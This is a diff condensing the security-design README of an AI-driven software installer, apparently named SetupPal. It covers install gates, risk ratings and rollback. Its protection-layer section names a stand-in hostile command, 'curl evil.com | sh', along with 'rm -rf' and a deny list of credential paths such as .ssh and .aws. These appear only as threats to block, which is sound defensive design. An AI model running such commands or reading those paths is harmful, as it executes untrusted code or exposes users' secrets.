@@ -2,83 +2,73 @@
 
 ## Overview
 
-SetupPal is an AI-powered assistant designed to help non-technical users install and configure software safely. Because an AI planner can be misled by search engine poisoning, hallucinated package names, or malicious copycat projects, SetupPal does not give the AI unrestricted access to the computer. Instead, it places a deterministic, multi-layer safety system between the AI and the operating system. This architecture is designed to contain blast radius and significantly reduce risk: actions are strictly typed, inspected against security databases, executed with the lowest necessary permissions, verified after completion, and recorded in an undoable ledger.
+SetupPal helps people install and configure software safely. Because an AI planner can be misled by search poisoning, hallucinated package names, or copycat projects, SetupPal never gives the model unrestricted access to the machine. A deterministic, multi-layer safety system sits between the AI and the OS: actions are strictly typed, inspected against security signals, executed with the lowest practical permissions, verified after completion, and recorded in an undoable ledger.
 
 ## Operational Boundary: What SetupPal Will Install
 
 SetupPal installs **anything that passes two gates**. It is not limited to developer tools.
 
 1. **Unattended CLI install and verification:** The software can be installed and verified from the command line with no interactive prompts (for example `winget install --silent`, `pip`, `npm`, `cargo`, official MSI/EXE silent flags such as `/quiet`, or Modrinth/Fabric through its CLI installer). Verification uses a fresh-process check such as a version command, `winget list`, or `pip show`.
-2. **Safety Engine:** Every step passes the deterministic checks described in [The Protection Layers](#the-protection-layers) and receives a Green or approved Yellow rating. Red steps are never run.
+2. **Safety Engine:** Every step passes the checks in [The Protection Layers](#the-protection-layers) and receives a Green or approved Yellow rating. Red steps are never run.
 
-**Manual-only software.** Anything that fails the first gate is not installed. Instead, SetupPal replies with a **Manual setup guide** that:
-- explains that SetupPal does not allow non-terminal setup,
-- gives step-by-step instructions the user can follow themselves, and
-- lists similar things SetupPal *can* install.
+**Manual-only software.** Anything that fails the first gate is not installed. SetupPal replies with a **Manual setup guide** that explains the limit, gives step-by-step instructions, and lists similar things SetupPal *can* install.
 
-**Trusted through winget means installable.** A winget package from the community repository has a reviewed manifest, a pinned installer URL, and a SHA-256 that winget checks before running it. If its installer type runs unattended (`msi`, `msix`, `wix`, `inno`, `nullsoft`, `burn`, `portable`, `zip`, or `exe` with the silent switches the community repo requires), SetupPal treats it as installable. That includes game launchers and apps that ask for a sign-in after install, such as Steam, Epic Games, Roblox, Discord, and LMMS: signing in happens later, in the app, and doesn't affect the install or its verification (`winget list --id <id> --exact`).
+**Trusted through winget means installable.** A winget package from the community repository has a reviewed manifest, a pinned installer URL, and a SHA-256 that winget checks before running it. If its installer type runs unattended (`msi`, `msix`, `wix`, `inno`, `nullsoft`, `burn`, `portable`, `zip`, or `exe` with the silent switches the community repo requires), SetupPal treats it as installable. That includes game launchers and apps that ask for a sign-in after install—Steam, Epic Games, Roblox, Discord, LMMS, and similar. Sign-in happens later in the app and does not affect install or verification (`winget list --id <id> --exact`).
 
-The gate judges each package by its winget manifest, never by a name list or by the AI model's opinion. These stay manual-only:
-1. **Microsoft Store-only products** (Store IDs such as `9NBLGGH2JHXJ` for Minecraft Bedrock, or installer type `msstore`): they need a Store account and can't be hash-checked against a static digest.
-2. **Vendor download pages** with no package-manager entry, for example most GPU drivers.
+The gate judges each package by its winget manifest, never by a name list or by the AI model’s opinion. These stay manual-only:
+
+1. **Microsoft Store-only products** (Store IDs such as `9NBLGGH2JHXJ` for Minecraft Bedrock, or installer type `msstore`): they need a Store account and cannot be hash-checked against a static digest.
+2. **Vendor download pages** with no package-manager entry (for example most GPU drivers).
 3. **Installers with no unattended mode**, and anything the Safety Engine rates Red.
 
-This is a per-app decision. For example, Minecraft Bedrock is manual-only, but the Minecraft Launcher (`Mojang.MinecraftLauncher`) and a Fabric mod setup for Minecraft Java can be installed.
+This is a per-app decision. Minecraft Bedrock is manual-only; the Minecraft Launcher (`Mojang.MinecraftLauncher`) and a Fabric mod setup for Minecraft Java can be installed.
 
 ---
 
 ## How a Typical Install Works
 
-Installing software with SetupPal follows a predictable six-step workflow designed to keep the user informed without overwhelming them:
-
-1. **User States a Goal:** The user enters a request in plain English (such as *"set up Python"* or *"install Minecraft mods"*).
-2. **SetupPal Builds a Plan Card:** The AI suggests an execution plan, but does not run it. The app displays a concise Plan Card listing every step, the source where files will be fetched from, and the risk rating. If the request is manual-only, SetupPal shows a Manual setup guide instead (see [Operational Boundary](#operational-boundary-what-setuppal-will-install)).
-3. **One-Click Approval:** If every step is verified safe (Green), the user approves the entire plan with a single click. There are no repetitive prompts for each individual file or sub-step.
-4. **Narrated Execution:** During execution, SetupPal switches to an active progress view. Pixel, the mascot, narrates each action as it occurs (downloading, checking hashes, installing) while maintaining a real-time activity feed.
-5. **Post-Install Verification:** SetupPal tests that the installed tool actually works in a clean, fresh process (such as running `python --version`). It reports the true outcome to the user rather than assuming success.
-6. **One-Click Undo Available:** Every completed task displays an **Undo** button. If the software is unwanted, broken, or installed by mistake, one click reverts the changes, cleans up the files, and restores the environment.
+1. **User states a goal** in plain English (for example *"set up Python"* or *"install Minecraft mods"*).
+2. **SetupPal builds a plan card.** The AI may suggest steps, but nothing runs yet. The card lists every step, source, and risk rating. Manual-only requests get a Manual setup guide instead (see [Operational Boundary](#operational-boundary-what-setuppal-will-install)).
+3. **One-click approval** when every step is Green. Yellow steps pause for explicit consent.
+4. **Narrated execution** with live progress. Pixel narrates mood only; facts stay in the activity feed and terminal.
+5. **Post-install verification** in a clean process (for example `python --version`). Outcomes are reported honestly.
+6. **One-click Undo (Rewind)** from History for SetupPal-managed changes.
 
 ---
 
 ## Security vs. Ease of Use
 
-Security tools often fail non-technical users by showing endless technical alerts that train people to click "Allow" without reading. SetupPal follows specific interaction rules to maintain security while avoiding prompt fatigue:
-
 - **Ask by risk, not by step:**
-  - **Green:** Safe, verified actions proceed without interrupting the user. All activity is logged in the feed.
-  - **Yellow:** Unverified, unusual, or higher-risk actions pause and ask for confirmation once, accompanied by a clear, plain-language reason.
-  - **Red:** Dangerous actions are blocked immediately. SetupPal never shows a "Run Anyway" button for Red actions; instead, it explains the threat and points to a safe alternative if one exists.
-- **Approve the plan once:** Rather than asking permission for every file download, folder creation, and environment variable update, SetupPal summarizes all steps in one plan card. One click approves the entire sequence if all steps are Green. Only a Yellow step pauses the sequence, and only for that specific step.
-- **Narrow trust accumulation:** Users can optionally check a *"Don't ask me about this kind of thing again"* box, but this trust is strictly scoped to a specific category (such as *"verified winget packages"*). It never applies globally. Any step flagged Yellow or Red will always interrupt and prompt the user regardless of saved preferences.
-- **Undo is the primary safety net:** Because every action is tracked and reversible, the app can safely reduce upfront friction. Users can proceed confidently knowing that unwanted changes can be rolled back cleanly.
+  - **Green:** verified safe; auto-approved within the plan; logged in the feed.
+  - **Yellow:** unverified, unusual, or higher risk; one confirmation with a plain-language reason.
+  - **Red:** blocked immediately. There is no “Run Anyway” for Red; SetupPal explains the threat and points to a safer alternative when one exists.
+- **Approve the plan once** when all steps are Green. Only a Yellow step pauses the sequence, and only for that step.
+- **Narrow trust accumulation:** optional “Don’t ask about this kind of thing again” is scoped to a category (for example verified winget packages), never global. Yellow and Red always interrupt.
+- **Undo is the primary safety net:** tracked, reversible actions reduce upfront friction without hiding risk.
 
 ---
 
 ## The Traffic-Light System
 
-SetupPal assigns every action a deterministic risk rating based on multi-signal scoring (from 0 to 100):
+Every action gets a deterministic risk rating (score 0–100):
 
 | Rating | Score Range | What It Means | What the User Sees | User Action Required |
 | :--- | :--- | :--- | :--- | :--- |
-| **Green** | 0 – 29 | Verified official source, trusted publisher, clean vulnerability record, valid file checksum. | A green badge with verified source links (e.g., `Getting this from python.org`). | None. Auto-approved within the overall plan. |
-| **Yellow** | 30 – 69 | Unverified website, newly published package, low download count, missing checksum, or admin requirement. | A yellow warning card explaining the reason in plain English with the source domain. | One-time approval required to proceed with this step. |
-| **Red** | 70 – 100 | Known vulnerability (CVE), typosquatting / copycat package, search-spoofed domain, or prohibited command. | A red block card explaining the risk, with the official safe alternative highlighted. | Hard block. No override button is provided. |
+| **Green** | 0 – 29 | Verified official source, trusted publisher, clean vulnerability record, valid checksum. | Green badge with verified source links (e.g. `Getting this from python.org`). | None. Auto-approved within the plan. |
+| **Yellow** | 30 – 69 | Unverified site, newly published package, low download count, missing checksum, or admin requirement. | Yellow warning with a plain-English reason and source domain. | One-time approval for this step. |
+| **Red** | 70 – 100 | Known CVE, typosquat / copycat, spoofed domain, or prohibited command. | Red block with risk explanation and a safe alternative when available. | Hard block. No override. |
 
 ---
 
 ## Source Transparency
 
-Every download or install action shown in the UI must clearly state its origin:
-
-- **Plain-language label with clickable link:** The UI displays a label alongside the live destination, such as `Getting this from python.org` linking directly to `https://www.python.org`.
-- **Actual domain guarantee:** The displayed domain must always be the real network host where the file originates. SetupPal never substitutes friendly display names that could mask the underlying URL.
-- **Untrusted domain flagging:** If a download source does not match the hardcoded official allowlist or verified consensus, SetupPal displays the raw domain and automatically flags the step as Yellow or Red. Showing the real domain provides an intentional, visible layer of defense where deceptive or misspelled domains stand out to users and reviewers.
+- Plain-language label with a clickable link to the live destination (e.g. `Getting this from python.org` → `https://www.python.org`).
+- The displayed domain is always the real network host—never a friendly mask.
+- Domains outside the official allowlist or verified consensus show the raw host and are flagged Yellow or Red.
 
 ---
 
 ## Plain-Language UI Translations
-
-Security warnings must be understandable to anyone. SetupPal translates technical findings into plain English across all UI views:
 
 | Technical Finding / Signal | Plain-English UI Translation | User-Facing Explanation |
 | :--- | :--- | :--- |
@@ -97,91 +87,74 @@ Security warnings must be understandable to anyone. SetupPal translates technica
 
 ## The Protection Layers
 
-SetupPal implements five distinct protection layers between the AI's suggestions and the operating system.
-
 ### Layer 1: Closed Action Schema
-- **Threat addressed:** AI hallucinations, prompt injection, and dangerous shell execution (such as `curl evil.com | sh`, `rm -rf`, or drive formatting).
-- **How it works:** The AI cannot execute arbitrary command-line strings. It can only propose structured actions from a fixed Rust enum (`Step`): `InstallPackage`, `DownloadArtifact`, `VerifyHash`, `AddToUserPath`, `CreateIsolatedEnv`, and `RunVerifyCommand`. The schema physically lacks commands for deleting user files or formatting disks. Arguments are checked to ensure they do not contain shell chaining characters (`;`, `|`, `&`, `>`, `<`, `$`, or backticks) and are run directly as process arguments without invoking `cmd.exe` or `powershell.exe`.
-- **Limitations:** Does not inspect the internal logic of compiled binaries executed by an allowed package manager or verification binary.
+
+- **Threat:** hallucinations, prompt injection, dangerous shell (`curl … \| sh`, `rm -rf`, drive formatting).
+- **How:** The AI proposes only structured `Step` actions (`InstallPackage`, `DownloadArtifact`, `VerifyHash`, `AddToUserPath`, `CreateIsolatedEnv`, `RunVerifyCommand`). Arguments cannot contain shell chaining characters and are passed as process argv—no `cmd.exe` / `powershell.exe` wrapper.
+- **Limit:** Does not inspect internals of binaries launched by an allowed package manager.
 
 ### Layer 2: Deterministic Safety Radar
-- **Threat addressed:** Malicious supply-chain packages, copycats, known published vulnerabilities, and search engine optimization (SEO) poisoning where fake websites mimic authentic projects.
-- **How it works:** Evaluates every step deterministically across multiple checks:
-  1. *Hard Policy:* Blocks prohibited commands, shell metacharacters, and sensitive path access (e.g., `.ssh`, `.aws`, browser credential stores).
-  2. *Typosquatting Radar:* Uses Levenshtein distance calculations to detect package names that closely mimic popular packages (e.g., `reqwests` instead of `requests`).
-  3. *Vulnerability Database:* Queries the OSV.dev database in real time for known vulnerabilities and security advisories.
-  4. *Web Search Consensus (Tavily):* Cross-references download URLs against developer repositories and web consensus to detect lookalike malware domains.
-  5. *Registry Metadata:* Inspects package release age, download counts, and setup scripts for obfuscation.
-- **Limitations:** Brand new ("zero-day") malware with no existing CVEs or reports, and packages that do not exhibit obvious typosquatting or naming anomalies, will not be caught by static heuristics.
+
+- **Threat:** supply-chain malware, copycats, known CVEs, SEO-poisoned domains.
+- **How:** Hard policy (prohibited commands, metacharacters, sensitive paths); typosquat radar (Levenshtein); OSV.dev; optional Tavily consensus; registry metadata (age, downloads, scripts).
+- **Limit:** Brand-new malware with clean metadata and no typosquat signal may not be caught.
 
 ### Layer 3: User-Scope Execution
-- **Threat addressed:** System-wide compromise, operating system corruption, persistent rootkits, and disabling of security tools like Windows Defender.
-- **How it works:** SetupPal runs software installations inside user space:
-  - Package managers are invoked with user-scope flags (e.g., `winget install --scope user`).
-  - Python dependencies are installed into dedicated virtual environments (`.venv/`) isolated to the project.
-  - Node packages are installed locally.
-  - User-scope processes do not hold permissions to modify `C:\Windows\System32` or global `Program Files` directories.
-- **Limitations:** User-scope processes still have access to the user's personal files, desktop, documents, and network connections. They can read or delete files owned by that user if the software is malicious.
+
+- **Threat:** system-wide compromise and OS corruption.
+- **How:** Prefer user-scope flags (`winget --scope user`), project `.venv` for Python, local Node installs. No permission to rewrite `System32` or global Program Files by default.
+- **Limit:** User-scope code still has the logged-in user’s file and network rights.
 
 ### Layer 4: Hash & Checksum Verification
-- **Threat addressed:** Man-in-the-middle tampering, incomplete downloads, and corrupted release files.
-- **How it works:** Downloaded artifacts must match the official cryptographic hash (SHA-256) provided by the package manifest or release metadata before execution or extraction occurs. If the calculated digest does not match, execution halts immediately with a Red rating.
-- **Limitations:** Relies on the upstream repository or manifest providing an authentic checksum. If the upstream repository account itself is compromised and the attacker updates both the file and the checksum, hash verification alone cannot detect the breach.
+
+- **Threat:** MITM, truncated downloads, corrupted releases.
+- **How:** Artifacts must match upstream SHA-256 before use; mismatch → Red halt.
+- **Limit:** If the upstream account is compromised and both file and checksum are replaced, hash checks alone cannot detect it.
 
 ### Layer 5: Transaction Ledger & 1-Click Undo
-- **Threat addressed:** Incomplete setups, orphaned files, polluted environment variables, and user remorse.
-- **How it works:** Every completed step is recorded in an append-only JSON Lines ledger (`.orchestrator_state.jsonl`). Each entry contains the exact inverse rollback action:
-  - Package installations store the silent uninstaller command.
-  - Path modifications store the previous `PATH` value for exact restoration.
-  - Downloads and isolated environments store their explicit directory and file boundaries.
-  Clicking **Undo** executes these rollback actions in reverse order to return the system to its prior state.
-- **Limitations:** Rollback can only remove files, directories, packages, and environment settings that SetupPal managed. If an installed application created independent files outside its designated directory during runtime, the basic uninstaller might leave those files behind.
+
+- **Threat:** orphaned files, polluted PATH, user remorse.
+- **How:** Append-only `.orchestrator_state.jsonl` with inverse rollback data. **Rewind** runs those actions in reverse.
+- **Limit:** Only SetupPal-managed paths and packages are removed. Runtime files the app creates elsewhere may remain.
 
 ---
 
 ## Handling Admin-Required Installs
 
-Certain software—such as hardware drivers and low-level system runtimes—requires Windows Administrator (UAC elevated) rights to install. SetupPal handles these through a dedicated, isolated flow, provided the install is still unattended and passes the Safety Engine:
+When an install still passes the unattended gate and Safety Engine but needs elevation:
 
-1. **Never bundled in Green plans:** Admin-level tasks are never marked Green and cannot be silently auto-approved.
-2. **Always Yellow:** Steps requiring elevation are classified as Yellow by default, requiring clear, separate user confirmation.
-3. **Explicit rationale:** The UI explains why administrator rights are needed (e.g., *"This driver requires administrator access to register system hardware components"*).
-4. **Standard Windows UAC prompt:** SetupPal does not bypass or automate Windows User Account Control; the user will still see the standard Windows system prompt before elevated execution can proceed.
+1. Never bundled as Green / silent auto-approve.
+2. Always Yellow with a clear rationale.
+3. Windows shows the normal UAC prompt—SetupPal does not bypass it.
 
 ---
 
 ## Failure Modes and Defaults
 
-When network services or verification checks experience disruptions, SetupPal follows strict fail-safe rules:
-
-- **Verification service outage or timeout:** If external APIs (such as OSV.dev or Tavily search) are unreachable or time out, SetupPal **fails closed to Yellow**. It will never silently mark an unverified package as Green, nor will it hard-block everything as Red. The user sees: *"SetupPal couldn't reach the verification service to verify this package. Would you like to review and proceed?"*
-- **Ambiguous packages:** If a requested package name matches multiple candidates or registries with conflicting information, SetupPal defaults to Yellow and prompts the user to select the authentic publisher.
-- **Checksum mismatches:** If a downloaded file does not match its expected SHA-256 hash, execution immediately terminates with a **Red** rating. The corrupt or modified file is not executed.
-- **Post-install verification failure:** If an installed binary cannot be invoked or fails its version/sanity test (e.g., `python --version` returns an error), SetupPal marks the task as failed, notifies the user honestly, and presents the option to Undo the installation.
-- **No unattended install path:** If an app cannot be installed and verified from the command line, SetupPal does not attempt it and returns a Manual setup guide instead.
+- **Verification outage:** fail closed to **Yellow**, never silent Green.
+- **Ambiguous packages:** Yellow; user picks the authentic publisher.
+- **Checksum mismatch:** **Red**; file is not executed.
+- **Post-install verify failure:** honest failure, Undo offered—no fake success.
+- **No unattended path:** Manual setup guide; no install attempt.
 
 ---
 
 ## What SetupPal Does NOT Protect Against
 
-To maintain realistic expectations, users and security evaluators should understand the operational boundaries of SetupPal:
-
-1. **Malicious code running with user permissions:** SetupPal confines installations to user scope to prevent operating system corruption. However, any code running in user scope has the same rights as the logged-in user: it can access files in the user's home directory, read documents, access local network shares, and transmit data over the Internet.
-2. **Unreported and Zero-Day threats:** No security system can detect every threat. If a new malicious package is published with clean metadata, no reported CVEs, and no detected typosquatting, SetupPal's safety radar will not flag it.
-3. **Compromised publisher accounts:** If a legitimate developer's account on PyPI, npm, or GitHub is hijacked and a malicious update is signed and released through official channels, hash checks and domain allowlists will treat it as valid until the community reports the incident.
-4. **Application-level software bugs:** SetupPal verifies the integrity and provenance of software packages, but cannot guarantee that third-party software is bug-free, stable, or compatible with other tools on the machine.
-5. **Intentional override of warnings:** If a user chooses to approve a Yellow-rated step containing unverified software, SetupPal will execute it as requested.
-6. **Manual setup guides:** Steps the user performs themselves by following a Manual setup guide happen outside SetupPal, so they are not checked by the Safety Engine, verified, or recorded for Undo.
+1. Malicious code running with the user’s permissions.
+2. Unreported / zero-day packages with clean metadata.
+3. Compromised publisher accounts on official registries.
+4. Bugs or incompatibility in third-party software.
+5. User approval of Yellow unverified steps.
+6. Steps the user performs themselves from a Manual setup guide (outside Safety Engine, verify, and Undo).
 
 ---
 
 ## Technical Appendix
 
-This section provides technical details for developers, security researchers, and system auditors.
-
 ### 1. Risk Scoring Engine & Thresholds
 
-Risk scores are normalized integers from `0` to `100`. The overall plan rating equals the maximum risk rating among all its constituent steps (`Green < Yellow < Red`).
+Risk scores are integers `0`–`100`. Plan rating = maximum step rating (`Green < Yellow < Red`).
 
 ```
 Risk Scores:
@@ -208,18 +181,11 @@ Risk Scores:
 
 ### 2. External Data Sources & APIs
 
-- **OSV.dev REST API (`https://api.osv.dev/v1/query`):** Queries open-source vulnerability databases across PyPI, npm, crates.io, Go, and Maven ecosystems.
-- **Tavily AI Search API (`https://api.tavily.com/search`):** Performs web consensus searches (`"official website and github repository for <tool>"`) to determine authentic distribution domains and identify lookalike domains.
-- **Package Registry Metadata APIs:**
-  - `winget` local manifest and source catalogs
-  - PyPI JSON API (`https://pypi.org/pypi/<package>/json`)
-  - npm registry API (`https://registry.npmjs.org/<package>`)
-  - Modrinth API v2 (`https://api.modrinth.com/v2`)
-  - GitHub Releases REST API
+- **OSV.dev REST API (`https://api.osv.dev/v1/query`):** vulnerability data for ecosystems SetupPal queries (PyPI and npm in this tree).
+- **Tavily AI Search API (`https://api.tavily.com/search`):** optional web consensus for authentic distribution domains.
+- **Package registry metadata:** winget local manifests; PyPI, npm, Modrinth API v2; GitHub Releases.
 
 ### 3. Core Codebase Modules
-
-The security architecture is implemented across the `crates/core` crate:
 
 ```
 crates/core/src/
